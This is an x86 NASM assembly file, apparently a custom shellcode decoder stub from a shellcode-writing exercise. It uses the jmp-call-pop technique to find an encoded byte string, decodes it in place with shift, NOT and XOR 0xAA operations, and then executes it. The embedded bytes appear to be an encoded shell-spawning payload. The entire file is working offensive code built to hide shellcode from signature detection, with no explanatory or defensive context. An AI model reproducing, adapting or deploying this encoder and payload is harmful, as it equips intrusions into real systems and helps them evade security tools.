; Decoder.nasm
; Author: Ravehorn

global _start

section .text

_start:

    jmp short call_decoder

decoder:
    
    pop esi
    
decode:

    cmp byte [esi], 0x7f
    je shellcode
    shl byte [esi], 0x1
    not byte [esi]
    xor byte [esi], 0xAA
    inc esi
    jmp short decode

call_decoder:

    call decoder

    shellcode: db 0x32, 0x4a, 0x02, 0x1e, 0x3d, 0x3d, 0x13, 0x1e, 0x1e, 0x3d, 0x1b, 0x1e, 0x1d, 0x6e, 0x5b, 0x02, 0x6e, 0x5b, 0x03, 0x6e, 0x5a, 0x72, 0x2f, 0x4c, 0x6a, 0x7f